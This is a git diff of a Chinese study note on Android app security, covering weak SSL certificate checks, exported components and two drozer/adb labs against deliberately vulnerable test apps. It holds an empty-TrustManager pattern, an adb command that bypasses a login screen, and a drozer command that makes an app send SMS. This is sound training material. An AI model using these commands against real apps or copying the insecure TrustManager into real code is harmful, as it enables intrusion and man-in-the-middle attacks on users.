@@ -103,7 +103,8 @@ tags:
 #### SSL证书弱校验漏洞
 ##### 成因
 不对Server端证书进行校验导致的TLS中间人攻击，开发者在校验证书时需要实现X509TrustManager类，包括checkClientTrusted、 checkServerTrusted、getAcceptedIssuers三个方法，如下：
-```
+
+```java
 private class MyTrustManager implements X509TrustManager{  
   
                 @Override  
@@ -127,6 +128,7 @@ private class MyTrustManager implements X509TrustManager{
                 }          
     }    
 ```
+
 1. 如果客户端APP在实现X509TruestManager类的checkServerTrusted 方法时，函数体为空，则不对服务端证书进行校验，会导致SSL证书弱校验漏洞。
 2. 如果客户端APP在使用HttpsURLConnection时，实现自定义 HostnameVerifier过程中未对主机名做验证，则默认不检查证书域名与站点域名是否匹配;或者在设置HttpsURLConnection的HostnameVerifier时，将其设为ALLOW_ALL_HOSTNAME_VERIFIER，则接受所有域名。这种不当的编程方式会导致SSL证书弱校验。
 
@@ -167,12 +169,14 @@ http://wy.hx99.net/bug_detail.php?wybug_id=wooyun-2014-048502
     - 不具有intent-filter标签时，默认为exported=false
 - 导出的组件是否有signature以上级别的权限控制
 2. 使用drozer
-```
+
+```bash
 dz> run app.package.attacksurface <package-name> //查看暴露组件
 dz> run app.activity.info -a <package-name> -i //查看activity信息
 dz> run app.service.info -a <package-name> -i //查看service信息
 dz> run app.broadcast.info -a <package-name> -i //查看broadcast receiver信息
 ```
+
 #### 实验
 ##### Activity暴露导致绕过认证
 > http://bobao.360.cn/learning/detail/122.html  
@@ -181,7 +185,8 @@ apk样本: https://pan.baidu.com/s/1eSZZZyi  密码:x07t
 - 或者采用drozer来自动分析app的攻击面
 
 1. 查看攻击面，发现两个导出的Activity
-```
+
+```bash
 dz> run app.package.attacksurface com.isi.testapp
 Attack Surface:
   2 activities exported
@@ -190,8 +195,9 @@ Attack Surface:
   0 services exported
     is debuggable
 ```
+
 2. 查看Activity具体信息，获得两个Activity名字
-```
+```bash
 dz> run app.activity.info -a com.isi.testapp -i
 Package: com.isi.testapp
   com.isi.testapp.MainActivity
@@ -204,12 +210,16 @@ Package: com.isi.testapp
   com.isi.testapp.Welcome
     Permission: null
 ```
+
 3. 尝试启动Welcome这个Activity，的确绕过了MainActivity的登录验证
-```
+
+```bash
 $ adb shell am start –n com.isi.testapp/.Welcome
 ```
-4. 这个是否多此一举呢？想看Welcome的Activity直接在layout看这个活动的布局不可以么？我们反编译apk找到这个布局文件来看一下。
-```
+
+4. 这个是否多此一举呢？想看Welcome的Activity直接在layout看这个活动的布局不可以么？我们反编译apk找到这个布局文件来看一下!
+
+```xml
 <?xml version="1.0" encoding="utf-8"?>
 <LinearLayout android:layout_height="fill_parent" android:layout_width="fill_parent" android:orientation="vertical" xmlns:android="http://schemas.android.com/apk/res/android">
     <Gallery android:background="@drawable/infosec" android:id="@id/gallery1" android:layout_gravity="center" android:layout_height="234.0dip" android:layout_marginTop="40.0dip" android:layout_width="278.0dip" />
@@ -222,7 +232,8 @@ $ adb shell am start –n com.isi.testapp/.Welcome
 > 样本fourgoats.apk介绍  
 出自OWASP的GoatDroid项目，集成了一堆漏洞的APK，代码未经过混淆与加密，可以反编译后看到比较清晰的逻辑，分析漏洞成因。虽然是许多年前的项目，很多漏洞也早已消失，但对于入门的新手来说还是有一定的价值的。下载地址：https://pan.baidu.com/s/1o957Nku  密码:ssz9  
 1. 查看攻击面，找到一个导出的广播接收器
-```
+
+```bash
 dz> run app.package.attacksurface org.owasp.goatdroid.fourgoats
 Attack Surface:
   4 activities exported
@@ -231,8 +242,10 @@ Attack Surface:
   1 services exported
     is debuggable
 ```
+
 2. 查看Broadcast具体信息，找到广播的类名，以及注册的Intent的动作
-```
+
+```bash
 dz> run app.broadcast.info -a org.owasp.goatdroid.fourgoats -i
 Package: org.owasp.goatdroid.fourgoats
   org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver
@@ -241,6 +254,7 @@ Package: org.owasp.goatdroid.fourgoats
         - org.owasp.goatdroid.fourgoats.SOCIAL_SMS
     Permission: null
 ```
+
 3. 如何利用？视频中老师直接给出以下这条命令：
 ```
 dz> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 10010 --extra string message hacked!
